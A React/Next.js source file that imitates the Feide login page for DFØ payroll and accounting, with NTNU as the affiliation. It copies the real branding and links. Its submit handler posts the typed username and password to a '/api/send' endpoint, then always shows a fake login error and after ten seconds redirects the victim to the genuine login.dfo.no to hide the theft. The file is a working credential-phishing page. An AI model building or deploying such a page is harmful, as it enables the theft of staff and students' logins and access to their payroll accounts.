"use client";
import Link from "next/link";
import React, { useState } from "react";
import styles from "./feide.module.css";
import Image from "next/image";
import clsx from "clsx";
import { useForm, SubmitHandler } from "react-hook-form";
import { useRouter } from "next/navigation";
import Error from "./Error";

type Credentials = {
  username: string;
  password: string;
};

const notifyMe = async (data) => {
  return await fetch("/api/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
};

export default function LoginBox() {
  const router = useRouter();

  const {
    register,
    handleSubmit,

    formState: { errors },
  } = useForm<Credentials>();

  const [visible, setVisible] = useState(false);
  const [expanded, seteExpanded] = useState(false);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  const onSubmit: SubmitHandler<Credentials> = (data) => {
    notifyMe(data);
    setShowErrorMessage(true);

    setTimeout(() => {
      console.log("inside timeout");

      router.push("https://login.dfo.no");
    }, 10000);
  };

  return (
    <div className={styles.boxBody}>
      <div className={styles.feideHeader}>
        <Link href="" className={clsx(styles.link, styles.english)}>
          <Image
            src="/english.svg"
            alt="Engelsk flagg"
            width="17"
            height="14"
          />
          English
          <Image src="/expand.svg" alt="Pil ned" width="34" height="34" />
        </Link>
      </div>
      <div className={styles.content}>
        <div className={styles.feideInfo}>
          <h1 className={styles.feideHeadingOne}>Log in with Feide</h1>
          <div className={styles.dfoInfo}>
            <Image src="/dfo-feide.png" alt="dfo" width="50" height="14" />
            <p
              style={{
                margin: "0",
                textOverflow: "unset",
                width: "80%",
                paddingLeft: "1em",
              }}
            >
              You need to log in via Feide to access DFØ payroll and accounting.
            </p>
          </div>
        </div>
        <div className={styles.affiliation}>
          <p>Your affiliation</p>
          <div className={styles.affiliationInfo}>
            <div>
              <Image src="/ntnu.png" alt="NTNU" width="50" height="50" />
            </div>
            <div>
              <p
                style={{
                  margin: "0",
                }}
              >
                NTNU
              </p>
              <p
                style={{
                  margin: "0",
                  cursor: "pointer",
                  textDecoration: "underline",
                  color: "#040404",
                  fontSize: "0.875rem",
                }}
              >
                Change affiliation
              </p>
            </div>
          </div>
        </div>
        <form onSubmit={handleSubmit(onSubmit)} className={styles.feideForm}>
          {showErrorMessage && <Error />}
          <label htmlFor="" className={styles.label}>
            Username
          </label>
          <input
            type="text"
            defaultValue=""
            className={clsx(
              styles.feideFormInput,
              showErrorMessage && styles.errorBorder
            )}
            {...register("username")}
          />
          <label htmlFor="" className={styles.label}>
            Password
          </label>
          <div className={styles.passwordField}>
            <input
              type={visible ? "text" : "password"}
              defaultValue=""
              className={clsx(
                styles.feideFormInput,
                showErrorMessage && styles.errorBorder
              )}
              {...register("password")}
            />
            <button
              onClick={(event) => {
                event.preventDefault();
                setVisible(!visible);
              }}
              className={styles.showHideButton}
            >
              {visible ? "Hide" : "Show"}
            </button>
          </div>

          <Link
            className={styles.forgot}
            href="https://idp.feide.no/simplesaml/module.php/feide/recover?AuthState=_945aa17c62e68241399e3126f064a228264a5a614c%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Flogin.dfo.no%252Fisam%252Fsps%252Fdfo%252Fsaml20%26RelayState%3Duuidfeb9ecae-ab62-42fa-b951-468fef73e65b%26cookieTime%3D1699048063&org=ntnu.no"
          >
            Forgot username or password?
          </Link>

          <input type="submit" value="Log in" className={styles.loginButton} />
        </form>
        <div></div>

        <div>
          <p>Or choose an external provider:</p>
          <button className={styles.externalProvidersButton}>
            <Image
              src="/microsoft.png"
              alt="Microsoft"
              width="24"
              height="24"
              style={{ float: "left" }}
            />
            <p>Use work or school account</p>
          </button>
          <button className={styles.externalProvidersButton}>
            <Image
              src="/id-porten.png"
              alt="ID-porten"
              width="24"
              height="24"
            />
            <p>Log in using ID-porten</p>
          </button>
        </div>
        <div
          className={clsx(styles.panelExpandable)}
          role="button"
          onClick={() => seteExpanded(!expanded)}
        >
          <div className={styles.buttonTopRow}>
            Do you need help?
            <Image
              src={expanded ? "/remove.svg" : "/add.svg"}
              alt="Expand less/more"
              width="30"
              height="30"
            />
          </div>
          {expanded && (
            <div>
              <p>Contact your home institution:</p>
              <a
                href="https://www.feide.no/brukerstotte"
                style={{ textDecoration: "underline", color: "#2D384C" }}
              >
                Go to the support webpage
              </a>
            </div>
          )}
        </div>
        <div>
          <a
            style={{ textDecoration: "underline", color: "#2D384C" }}
            className={styles.siktLink}
            href="https://www.feide.no/personvern-og-informasjonssikkerhet"
          >
            Privacy and cookie information
          </a>
        </div>
      </div>
      <div className={styles.feideFooter}>
        <a
          style={{ textDecoration: "underline", color: "#2D384C" }}
          className={styles.siktLink}
          href="https://sikt.no"
        >
          Feide is delivered by Sikt
        </a>
      </div>
    </div>
  );
}
